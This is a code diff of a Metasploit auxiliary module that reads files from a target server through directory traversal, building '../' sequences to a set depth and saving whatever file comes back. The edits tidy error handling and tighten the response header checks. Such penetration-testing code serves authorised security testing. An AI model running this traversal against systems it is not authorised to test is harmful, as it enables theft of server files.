@@ -44,7 +44,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    traversal = "../" * datastore['DEPTH']
+    traversal = '../' * datastore['DEPTH']
     filename = datastore['FILEPATH']
     filename = filename[1, filename.length] if filename =~ /^\//
 
@@ -59,11 +59,16 @@ class Metasploit3 < Msf::Auxiliary
     )
 
     unless res && res.body
-      fail_with(Failure::Unknown, "#{peer} - Server did not respond in an expected way.")
+      vprint_error("#{peer} - Server did not respond in an expected way.")
       return
     end
 
-    if res.code == 200 && res.body.length > 0 && res.headers['Content-Disposition'].include?('attachment; filename')
+    if res.code == 200 &&
+        res.body.length > 0 &&
+        res.headers['Content-Disposition'] &&
+        res.headers['Content-Disposition'].include?('attachment; filename') &&
+        res.headers['Content-Length'] &&
+        res.headers['Content-Length'].to_i > 0
 
       vprint_line("#{res.body}")
       fname = datastore['FILEPATH']
@@ -78,7 +83,7 @@ class Metasploit3 < Msf::Auxiliary
 
       print_good("#{peer} - File saved in: #{path}")
     else
-      print_error("#{peer} - Nothing was downloaded. You can try to change the DEPTH parameter or verify the correct filename.")
+      vprint_error("#{peer} - Nothing was downloaded. You can try to change the DEPTH parameter or verify the correct filename.")
     end
   end
 end
